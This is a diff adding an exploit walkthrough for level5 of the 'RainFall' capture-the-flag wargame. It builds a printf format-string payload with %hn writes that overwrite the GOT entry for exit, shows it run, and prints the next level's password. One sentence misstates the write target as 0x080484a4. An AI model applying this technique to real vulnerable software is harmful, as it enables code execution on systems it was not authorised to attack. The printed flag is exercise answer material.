@@ -78,6 +78,34 @@ OFFSET   TYPE              VALUE
 0804983c R_386_JUMP_SLOT   __libc_start_main
 ```
 
+The above list of dynamic relocation entries shows us the adresses where the program will jump when one of theses functions (included from shared libraries) are called.
+
+So, using the same `printf` vulnerability as in the previous level, we will overwrite the address pointed by `exit` from the GOT with the address of the function `o` (0x080484a4).
+
 ## Exploit
 
-python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/level5
+Once again, the field width modifier of `printf` will help us to write the value we want. But this value is so high (0x080484a4 => 134 513 828 in decimal) that trying to use it as such for the padding leads us to a long waiting (for the printf writing) and no result.
+
+Looking for a way to write large values with the `printf` format string vulnerability, we find that we can split the writing process by using the type conversion specifiers. For our case, halving the number of bytes that we write will do the trick.
+
+Knowing that we want to write the value 080484a4 to the address 0x080484a4, we will proceed as follow :
+- Split the value in two parts for the padding (0804 and 84a4 => 2052 and 33956 in decimal).
+- Start the string with the target address + 2, then the target address itself. (the reverse order is due to the endianness).
+- Use both type conversion specifier and argument reference to write two bytes twice.
+
+We first dump the stack with some `%x` to spot which argument (the 4th here) corresponds to the beginning of our string on the stack (see previous level). Let's describe how we format the final string :
+- First, put the two target adresses : "\x3a\x98\x04\x08\x38\x98\x04\x08"
+- Then, we set the padding to write the value 2052 (0804). Do not forget to subtract 8 (from the addresses printed before) : "%2044x"
+- Write a short integer (2-byte long) to the first address we have provided : "%4$hn"
+- Set the padding to reach the second value to write (33956). Subtract the number of bytes written so far (2052) : "%31904x"
+- Finally, write the second part of the value to the two bytes corresponding to the target address : "%5$hn"
+
+Everything is set now, let's do it !
+
+```console
+level5@RainFall:~$ python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/level5
+level5@RainFall:~$ cat /tmp/level5 - | ./level5
+...
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+```
